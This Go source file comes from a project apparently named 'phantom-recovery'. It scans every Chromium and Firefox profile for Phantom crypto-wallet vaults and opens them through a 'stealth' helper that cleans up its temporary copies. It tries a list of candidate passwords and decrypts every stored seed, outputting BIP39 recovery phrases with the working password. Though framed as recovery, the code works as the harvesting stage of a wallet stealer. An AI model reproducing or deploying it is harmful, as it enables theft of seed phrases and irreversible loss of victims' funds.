//go:build windows

package phantom

import (
	"crypto/sha256"
	"crypto/sha512"
	"encoding/json"
	"errors"
	"fmt"
	"hash"
	"strings"

	"phantom-recovery/internal/browser"
	"phantom-recovery/internal/types"

	"github.com/mr-tron/base58"
	"github.com/syndtr/goleveldb/leveldb"
	"github.com/syndtr/goleveldb/leveldb/util"
	"github.com/tyler-smith/go-bip39"
	"golang.org/x/crypto/nacl/secretbox"
	"golang.org/x/crypto/pbkdf2"
	"golang.org/x/crypto/scrypt"
)

// ExtensionID is the Chrome Web Store ID for Phantom wallet.
const ExtensionID = "bfnaelmomeimhlpmgjnjophhpkkoljpa"

// LogFunc is an optional log callback.
var LogFunc func(tag, format string, args ...interface{})

func log(tag, format string, args ...interface{}) {
	if LogFunc != nil {
		LogFunc(tag, format, args...)
	}
}

// ---------------------------------------------------------------------------
// Vault JSON structures
// ---------------------------------------------------------------------------

// encryptedBlob represents a Phantom encrypted data structure.
// All binary fields (salt, nonce, encrypted) are Base58-encoded strings.
type encryptedBlob struct {
	Salt       string `json:"salt"`
	Nonce      string `json:"nonce"`
	Encrypted  string `json:"encrypted"`
	Iterations int    `json:"iterations"`
	Digest     string `json:"digest"`
	KDF        string `json:"kdf"`
}

type encryptionKeyEntry struct {
	EncryptedKey encryptedBlob `json:"encryptedKey"`
}

type seedVaultEntry struct {
	Content encryptedBlob `json:"content"`
}

// ---------------------------------------------------------------------------
// Discovery
// ---------------------------------------------------------------------------

// FindVaults scans all Chromium browsers and profiles for Phantom LevelDB vaults.
func FindVaults() []browser.VaultInfo {
	return browser.FindExtensionVaults(ExtensionID)
}

// ---------------------------------------------------------------------------
// Extraction
// ---------------------------------------------------------------------------

// TryExtract attempts to decrypt Phantom vaults using the provided passwords.
// Returns all successful extractions. Each vault may contain multiple seed entries.
func TryExtract(passwords []string) []types.WalletResult {
	vaults := FindVaults()
	if len(vaults) == 0 {
		return nil
	}

	log("PH", "Found %d Phantom vault(s)", len(vaults))

	var results []types.WalletResult
	for _, vault := range vaults {
		vaultResults := tryVault(vault, passwords)
		results = append(results, vaultResults...)
	}
	return results
}

// TryExtractAt attempts to decrypt a specific vault path with the given passwords.
func TryExtractAt(vaultPath string, passwords []string) []types.WalletResult {
	vault := browser.VaultInfo{Browser: "manual", Profile: "manual", Path: vaultPath}
	return tryVault(vault, passwords)
}

func tryVault(vault browser.VaultInfo, passwords []string) []types.WalletResult {
	db, tempPath, err := browser.OpenVaultStealth(vault.Path)
	if err != nil {
		log("PH", "Failed to open vault %s/%s: %v", vault.Browser, vault.Profile, err)
		return nil
	}
	defer db.Close()
	defer browser.CleanupVault(tempPath)

	// Phase 1: Read the encrypted master key entry
	encKeyRaw, err := db.Get([]byte(".phantom-labs.encryption.encryptionKey"), nil)
	if err != nil {
		log("PH", "No encryption key in %s/%s: %v", vault.Browser, vault.Profile, err)
		return nil
	}

	var encKeyEntry encryptionKeyEntry
	if err := json.Unmarshal(encKeyRaw, &encKeyEntry); err != nil {
		log("PH", "Invalid encryption key JSON in %s/%s: %v", vault.Browser, vault.Profile, err)
		return nil
	}

	ek := encKeyEntry.EncryptedKey
	if ek.Salt == "" || ek.Nonce == "" || ek.Encrypted == "" {
		log("PH", "Encryption key missing fields in %s/%s", vault.Browser, vault.Profile)
		return nil
	}

	// Decode Base58 fields
	ekSalt, err := base58.Decode(ek.Salt)
	if err != nil {
		log("PH", "Bad salt encoding in %s/%s: %v", vault.Browser, vault.Profile, err)
		return nil
	}
	ekNonce, err := base58.Decode(ek.Nonce)
	if err != nil {
		log("PH", "Bad nonce encoding in %s/%s: %v", vault.Browser, vault.Profile, err)
		return nil
	}
	ekEncrypted, err := base58.Decode(ek.Encrypted)
	if err != nil {
		log("PH", "Bad encrypted key encoding in %s/%s: %v", vault.Browser, vault.Profile, err)
		return nil
	}

	// Phase 2: Try each password to decrypt the master key
	var masterKey []byte
	var usedPassword string

	for _, password := range passwords {
		derivedKey, err := deriveKey([]byte(password), ekSalt, ek.Iterations, ek.Digest, ek.KDF)
		if err != nil {
			continue
		}

		mk, err := decryptSecretBox(ekEncrypted, ekNonce, derivedKey)
		if err != nil {
			continue // wrong password
		}

		masterKey = mk
		usedPassword = password
		log("PH", "Master key decrypted in %s/%s with password [%d chars]", vault.Browser, vault.Profile, len(password))
		break
	}

	if masterKey == nil {
		return nil // no password worked
	}

	// Phase 3: Find and decrypt ALL seed vault entries
	seedEntries, err := findAllSeedEntries(db)
	if err != nil {
		log("PH", "No seed entries in %s/%s: %v", vault.Browser, vault.Profile, err)
		return nil
	}

	log("PH", "Found %d seed entry(ies) in %s/%s", len(seedEntries), vault.Browser, vault.Profile)

	var results []types.WalletResult
	for _, entry := range seedEntries {
		result, err := decryptSeedEntry(entry, masterKey, usedPassword, vault)
		if err != nil {
			log("PH", "Failed to decrypt seed entry in %s/%s: %v", vault.Browser, vault.Profile, err)
			continue
		}
		results = append(results, *result)
	}

	return results
}

// ---------------------------------------------------------------------------
// Seed entry decryption
// ---------------------------------------------------------------------------

func decryptSeedEntry(entry *seedVaultEntry, masterKey []byte, password string, vault browser.VaultInfo) (*types.WalletResult, error) {
	sc := entry.Content
	if sc.Salt == "" || sc.Nonce == "" || sc.Encrypted == "" {
		return nil, errors.New("seed entry missing fields")
	}

	seedSalt, err := base58.Decode(sc.Salt)
	if err != nil {
		return nil, fmt.Errorf("bad seed salt: %w", err)
	}
	seedNonce, err := base58.Decode(sc.Nonce)
	if err != nil {
		return nil, fmt.Errorf("bad seed nonce: %w", err)
	}
	seedEncrypted, err := base58.Decode(sc.Encrypted)
	if err != nil {
		return nil, fmt.Errorf("bad seed encrypted: %w", err)
	}

	// Apply defaults matching Phantom's implementation
	seedIterations := sc.Iterations
	if seedIterations <= 0 {
		seedIterations = 10000
	}
	seedDigest := sc.Digest
	if seedDigest == "" {
		seedDigest = "sha256"
	}
	seedKDF := sc.KDF
	if seedKDF == "" {
		seedKDF = "scrypt"
	}

	// Derive seed-specific key from the master key
	seedKey, err := deriveKey(masterKey, seedSalt, seedIterations, seedDigest, seedKDF)
	if err != nil {
		return nil, fmt.Errorf("seed key derivation: %w", err)
	}

	seedPlaintext, err := decryptSecretBox(seedEncrypted, seedNonce, seedKey)
	if err != nil {
		return nil, fmt.Errorf("seed decryption failed")
	}

	// Parse entropy from the decrypted JSON and generate BIP39 mnemonic
	entropy, name, err := parseSeedJSON(seedPlaintext)
	if err != nil {
		return nil, fmt.Errorf("seed JSON parse: %w", err)
	}

	mnemonic, err := bip39.NewMnemonic(entropy)
	if err != nil {
		return nil, fmt.Errorf("mnemonic generation: %w", err)
	}

	location := fmt.Sprintf("%s/%s", vault.Browser, vault.Profile)
	if name != "" {
		location += " (" + name + ")"
	}

	return &types.WalletResult{
		Source:   "phantom",
		Mnemonic: mnemonic,
		Password: password,
		Location: location,
	}, nil
}

// ---------------------------------------------------------------------------
// LevelDB seed entry discovery
// ---------------------------------------------------------------------------

func findAllSeedEntries(db *leveldb.DB) ([]*seedVaultEntry, error) {
	iter := db.NewIterator(util.BytesPrefix([]byte(".phantom-labs.vault.seed.")), nil)
	defer iter.Release()

	var entries []*seedVaultEntry
	for iter.Next() {
		var entry seedVaultEntry
		if err := json.Unmarshal(iter.Value(), &entry); err != nil {
			continue
		}
		entries = append(entries, &entry)
	}

	if len(entries) == 0 {
		return nil, errors.New("no seed vault entries found")
	}
	return entries, nil
}

// ---------------------------------------------------------------------------
// Seed JSON parsing
// ---------------------------------------------------------------------------

func parseSeedJSON(data []byte) (entropy []byte, name string, err error) {
	var seed struct {
		Name    string          `json:"name"`
		Entropy json.RawMessage `json:"entropy"`
	}

	if err = json.Unmarshal(data, &seed); err != nil {
		return nil, "", fmt.Errorf("invalid seed JSON: %w", err)
	}

	if len(seed.Entropy) == 0 {
		return nil, "", errors.New("seed JSON missing entropy field")
	}

	entropy, err = parseEntropy(seed.Entropy)
	if err != nil {
		return nil, "", err
	}

	// Validate entropy length for BIP39
	validLengths := map[int]bool{16: true, 20: true, 24: true, 28: true, 32: true}
	if !validLengths[len(entropy)] {
		return nil, "", fmt.Errorf("invalid entropy length: %d bytes", len(entropy))
	}

	return entropy, seed.Name, nil
}

// parseEntropy handles both JSON array [1,2,3,...] and object {"0":1,"1":2,...} formats.
func parseEntropy(raw json.RawMessage) ([]byte, error) {
	// Try as JSON array first
	var arr []float64
	if err := json.Unmarshal(raw, &arr); err == nil && len(arr) > 0 {
		result := make([]byte, len(arr))
		for i, v := range arr {
			if v < 0 || v > 255 {
				return nil, fmt.Errorf("entropy value out of range at %d: %f", i, v)
			}
			result[i] = byte(v)
		}
		return result, nil
	}

	// Try as JSON object with numeric string keys
	var obj map[string]float64
	if err := json.Unmarshal(raw, &obj); err == nil && len(obj) > 0 {
		result := make([]byte, len(obj))
		for i := 0; i < len(obj); i++ {
			key := fmt.Sprintf("%d", i)
			val, exists := obj[key]
			if !exists {
				return nil, fmt.Errorf("entropy object missing key %q", key)
			}
			if val < 0 || val > 255 {
				return nil, fmt.Errorf("entropy value out of range for key %q: %f", key, val)
			}
			result[i] = byte(val)
		}
		return result, nil
	}

	return nil, errors.New("entropy is neither an array nor a numeric object")
}

// ---------------------------------------------------------------------------
// Crypto helpers
// ---------------------------------------------------------------------------

// deriveKey derives a 32-byte key using either scrypt or PBKDF2.
func deriveKey(password, salt []byte, iterations int, digest, kdf string) ([]byte, error) {
	const keyLen = 32

	switch strings.ToLower(kdf) {
	case "scrypt":
		// Phantom uses N=4096, r=8, p=1
		return scrypt.Key(password, salt, 4096, 8, 1, keyLen)

	default: // "pbkdf2" or unspecified
		if iterations <= 0 {
			iterations = 10000
		}

		var hashFunc func() hash.Hash
		switch strings.ToLower(digest) {
		case "sha512":
			hashFunc = sha512.New
		default: // "sha256" or unspecified
			hashFunc = sha256.New
		}

		return pbkdf2.Key(password, salt, iterations, keyLen, hashFunc), nil
	}
}

// decryptSecretBox decrypts NaCl secretbox (XSalsa20-Poly1305).
func decryptSecretBox(encrypted, nonce, key []byte) ([]byte, error) {
	if len(nonce) != 24 {
		return nil, fmt.Errorf("invalid nonce length: %d (expected 24)", len(nonce))
	}
	if len(key) != 32 {
		return nil, fmt.Errorf("invalid key length: %d (expected 32)", len(key))
	}

	var nonceArr [24]byte
	var keyArr [32]byte
	copy(nonceArr[:], nonce)
	copy(keyArr[:], key)

	plaintext, ok := secretbox.Open(nil, encrypted, &nonceArr, &keyArr)
	if !ok {
		return nil, errors.New("secretbox decryption failed")
	}
	return plaintext, nil
}

func FindFirefoxVaults() []browser.FFVaultInfo {
	return browser.FindFirefoxPhantomVaults()
}

func TryExtractFirefox(passwords []string) []types.WalletResult {
	vaults := FindFirefoxVaults()
	if len(vaults) == 0 { return nil }
	log("PH", "Found %d Firefox Phantom vault(s)", len(vaults))
	var results []types.WalletResult
	for _, vault := range vaults {
		r := tryFirefoxVault(vault, passwords)
		if r != nil { results = append(results, *r) }
	}
	return results
}

func tryFirefoxVault(vault browser.FFVaultInfo, passwords []string) *types.WalletResult {
	store, err := browser.OpenFFVault(vault.DBPath)
	if err != nil { log("PH", "Failed to open Firefox vault: %v", err); return nil }
	defer store.Close()

	encKeyRaw, err := store.Get(".phantom-labs.encryption.encryptionKey")
	if err != nil { log("PH", "No encryption key in %s/%s: %v", vault.Browser, vault.Profile, err); return nil }

	var encKeyEntry encryptionKeyEntry
	if err := json.Unmarshal(encKeyRaw, &encKeyEntry); err != nil { return nil }

	ek := encKeyEntry.EncryptedKey
	ekSalt, _ := base58.Decode(ek.Salt)
	ekNonce, _ := base58.Decode(ek.Nonce)
	ekEncrypted, _ := base58.Decode(ek.Encrypted)

	var masterKey []byte; var usedPassword string
	for _, password := range passwords {
		dk, err := deriveKey([]byte(password), ekSalt, ek.Iterations, ek.Digest, ek.KDF)
		if err != nil { continue }
		mk, err := decryptSecretBox(ekEncrypted, ekNonce, dk)
		if err != nil { continue }
		masterKey = mk; usedPassword = password; break
	}
	if masterKey == nil { return nil }

	seedData, err := store.GetPrefix(".phantom-labs.vault.seed.")
	if err != nil { return nil }
	if len(seedData) == 0 { return nil }

	for _, raw := range seedData {
		var entry seedVaultEntry
		if json.Unmarshal(raw, &entry) != nil { continue }
		result, err := decryptSeedEntry(&entry, masterKey, usedPassword, browser.VaultInfo{Browser: vault.Browser, Profile: vault.Profile, Path: vault.DBPath})
		if err != nil { continue }
		return result
	}
	return nil
}

